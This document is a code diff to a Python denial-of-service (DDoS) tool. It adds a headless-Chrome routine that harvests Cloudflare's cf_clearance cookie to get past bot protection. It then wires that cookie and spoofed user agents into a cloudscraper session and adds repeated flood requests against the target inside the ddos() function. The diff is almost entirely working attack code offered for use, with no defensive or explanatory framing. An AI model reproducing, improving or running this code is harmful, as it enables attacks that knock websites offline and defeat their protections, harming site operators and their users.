@@ -50,6 +50,36 @@ def countdown(times):
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
             return
 
+def get_cookie(url):
+    global useragent, cookieJAR, cookie
+    options = webdriver.ChromeOptions()
+    arguments = [
+    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
+    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
+    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
+    ]
+    for argument in arguments:
+        options.add_argument(argument)
+    driver = webdriver.Chrome(options=options)
+    driver.implicitly_wait(3)
+    driver.get(url)
+    for _ in range(60):
+        cookies = driver.get_cookies()
+        tryy = 0
+        for i in cookies:
+            if i['name'] == 'cf_clearance':
+                cookieJAR = driver.get_cookies()[tryy]
+                useragent = driver.execute_script("return navigator.userAgent")
+                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                driver.quit()
+                return True
+            else:
+                tryy += 1
+                pass
+        time.sleep(1)
+    driver.quit()
+    return False
+
 useragents = [
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
@@ -2442,7 +2472,7 @@ def get_proxies():
             }
     
 
-def Headers(method):
+def Headerss(method):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -2472,7 +2502,11 @@ def Headers(method):
 def ddos():
     socksCrawler()
     socksCrawlz()
-    scraper = cloudscraper.create_scraper()
+    session = requests.Session()
+    scraper = cloudscraper.create_scraper(sess=session)
+    jar = RequestsCookieJar()
+    jar.set(cookieJAR['name'], cookieJAR['value'])
+    scraper.cookies = jar
     req =  "GET / HTTP/1.1\r\nHost: " + urlparse(ip).netloc + "\r\n"
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -2522,6 +2556,10 @@ def ddos():
             scraper.get(ip, proxz=proxy)
             scraper.get(ip, proxz=proxy)
             scraper.get(ip, proxz=proxy)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
             s.send(data)
             s.send(data)
             s.send(data)
